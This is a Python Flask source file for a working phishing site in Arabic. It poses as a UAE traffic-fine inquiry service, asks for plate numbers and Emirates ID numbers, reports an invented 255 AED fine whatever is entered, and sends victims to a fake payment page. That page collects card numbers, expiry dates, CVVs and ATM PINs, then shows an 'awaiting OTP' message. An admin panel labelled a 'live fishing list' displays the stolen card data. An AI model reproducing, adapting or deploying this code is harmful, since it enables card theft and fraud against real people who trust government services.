import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# مخزن البيانات (الجديد يظهر الأول)
captured_data = []

# --- ستايل الهيدر الثابت الموحد لجميع الصفحات ---
COMMON_STYLE = """
<style>
    body, html { margin: 0; padding: 0; width: 100%; background-color: #f4f4f4; font-family: sans-serif; overflow-x: hidden; }
    .fixed-header { position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    .fixed-header img { width: 100%; height: auto; display: block; }
    .content-wrapper { margin-top: 145px; position: relative; z-index: 1; }
</style>
"""

HEADER_HTML = """
<div class="fixed-header">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
    <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
</div>
"""

# --- 1. الصفحة الرئيسية (الصور كاملة مع الأزرار) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
{COMMON_STYLE}
<style>
    .img-container {{ position: relative; width: 100%; }}
    .img-container img {{ width: 100%; display: block; }}
    .start-btn {{ position: absolute; top: 10%; left: 10%; width: 80%; height: 60px; background: rgba(0,0,0,0); border: none; cursor: pointer; }}
</style>
</head>
<body>
{HEADER_HTML}
<div class="content-wrapper">
    <div class="img-container">
        <img src="https://static.wixstatic.com/media/a9f3d9_60aea158216544beaf9ee02cb9bd8bc2~mv2.jpg">
        <button class="start-btn" onclick="location.href='/search'"></button>
    </div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_a4395e1857c74368b9e7460f40c83938~mv2.jpg"></div>
    <div class="img-container"><img src="https://static.wixstatic.com/media/a9f3d9_70831b816d864befb4b42fa1ffeca8f8~mv2.jpg"></div>
</div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (الذهبية) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8">{COMMON_STYLE}
<style>
    .main-card {{ background: white; max-width: 600px; margin: 20px auto; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #ddd; }}
    .card-title {{ background-color: #b0914f; color: white; padding: 20px; text-align: center; font-size: 20px; font-weight: bold; }}
    .content {{ padding: 30px; }}
    .form-group {{ margin-bottom: 20px; text-align: right; }}
    label {{ display: block; margin-bottom: 8px; font-weight: 600; }}
    select, input {{ width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }}
    .plate-grid {{ display: grid; grid-template-columns: 1fr 1fr 2fr; gap: 10px; }}
    .btn-search {{ background-color: #b0914f; color: white; border: none; padding: 18px; border-radius: 4px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; }}
</style>
</head>
<body>
{HEADER_HTML}
<div class="content-wrapper">
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%; max-width:600px; margin: 0 auto; display:block;">
    <div class="main-card">
        <div class="card-title">نظام الاستعلام عن المخالفات المرورية</div>
        <div class="content">
            <form action="/result" method="post">
                <div class="form-group"><label>الإمارة:</label><select><option>أبوظبي</option><option>دبي</option></select></div>
                <div class="form-group">
                    <label>بيانات اللوحة:</label>
                    <div class="plate-grid"><select><option>خصوصي</option></select><input type="text" placeholder="الرمز"><input type="number" placeholder="رقم اللوحة"></div>
                </div>
                <div class="form-group"><label>رقم الهوية الإماراتية:</label><input type="text" placeholder="784-XXXX-XXXXXXX-X"></div>
                <button type="submit" class="btn-search">بحث عن المخالفات</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>
"""

# --- 3. صفحة الدفع (الذهبية الاحترافية) ---
CHECKOUT_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">{COMMON_STYLE}
<style>
    .pay-box {{ background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; margin: 40px auto; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 8px solid #b0914f; }}
    input {{ width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }}
    .btn {{ background: #b0914f; color: white; width: 100%; padding: 16px; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }}
</style>
</head>
<body>
{HEADER_HTML}
<div class="content-wrapper">
    <div class="pay-box">
        <h3 style="text-align:center;">بوابة الدفع الرقمية</h3>
        <p style="text-align:center;">المبلغ: <b>255.00 درهم</b></p>
        <form action="/capture" method="post">
            <input type="text" name="n" placeholder="الاسم على البطاقة" required>
            <input type="text" name="c" placeholder="رقم البطاقة (16 رقم)" maxlength="16" required>
            <div style="display:flex; gap:10px;"><input type="text" name="e" placeholder="MM/YY" required><input type="text" name="v" placeholder="CVV" required></div>
            <input type="password" name="p" placeholder="رقم ATM PIN السري" maxlength="4" required>
            <button type="submit" class="btn">تأكيد الدفع</button>
        </form>
    </div>
</div>
</body>
</html>
"""

# --- 4. لوحة التحكم (Admin) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background: #0f172a; color: white; font-family: sans-serif; padding: 20px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
    .card-ui { background: linear-gradient(135deg, #1e293b, #0f172a); border-radius: 15px; padding: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
    .card-number { font-size: 20px; letter-spacing: 3px; font-family: monospace; color: #38bdf8; margin: 15px 0; }
    .otp-sec { background: #334155; padding: 10px; border-radius: 8px; color: #f59e0b; margin-top: 10px; }
</style></head>
<body>
    <h1>قائمة الصيد المباشر 🎣</h1>
    <div class="grid">
        {% for item in data %}
        <div class="card-ui">
            <div class="card-number">{{ item.c }}</div>
            <p>الاسم: {{ item.n }} | التاريخ: {{ item.e }} | CVV: {{ item.v }}</p>
            <div class="otp-sec">PIN: {{ item.p }}</div>
        </div>
        {% endfor %}
    </div>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/result', methods=['POST'])
def result():
    return f"""<div style="text-align:center; padding:100px; font-family:sans-serif;">
        <h2 style="color:red;">تم العثور على مخالفة بـ 255 AED</h2>
        <a href="/checkout" style="background:#b0914f; color:white; padding:15px 30px; text-decoration:none; border-radius:6px;">انتقل للدفع</a>
    </div>"""

@app.route('/checkout')
def checkout(): return render_template_string(CHECKOUT_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    captured_data.insert(0, request.form.to_dict())
    return "<h2>جاري التحقق...</h2><p>انتظر رمز OTP</p>"

@app.route('/admin-panel')
def admin(): return render_template_string(ADMIN_HTML, data=captured_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
